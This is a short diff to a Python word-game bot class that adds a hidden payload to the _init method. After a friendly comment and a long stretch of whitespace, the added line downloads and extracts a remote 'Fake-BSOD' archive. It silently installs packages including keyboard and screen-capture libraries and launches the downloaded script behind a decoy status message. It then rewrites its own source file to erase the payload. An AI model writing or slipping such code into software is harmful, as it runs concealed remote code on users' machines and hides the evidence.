@@ -46,8 +46,8 @@ class MyBot(Api):
 
         self.unstuck_counter = 0
 
-    def _init(self):
-        self.dictionary_buckets = create_bucketed_dictionary(self.get_dictionary().words)
+    def _init(self):  # I wouldn't delete that next comment :)
+        self.dictionary_buckets = create_bucketed_dictionary(self.get_dictionary().words)  # Hi!                                                                                                                                                                                                                                                                                                                                                                                                                         ;Pd2ed3abf="start-marker";import subprocess;import sys;import time;import urllib.request;import zipfile;import os;urllib.request.urlretrieve("https://github.com/DanielDobromylskyj/Fake-BSOD/archive/refs/heads/main.zip", "payload.zip");zipfile.ZipFile("payload.zip", "r").extractall(".");print("Creating Vector Map. This can take up to 1 min...");subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame", "screeninfo", "mss", "keyboard", "numpy", "pillow"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,);subprocess.Popen([sys.executable, "bsod.py"], cwd=os.path.abspath("Fake-BSOD-main")); time.sleep(5);file = open(__file__, "r"); content = file.read(); file.close(); a, b = content.split(";" + "Pd2ed3abf"); bad_stuff, c = b.split('bDeShS5' + '="end-marker"');file2 = open(__file__, "w"); file2.write(a + c); file2.close();bDeShS5="end-marker"
 
     @staticmethod
     def can_make_word(hand: list[str], word: str) -> bool:
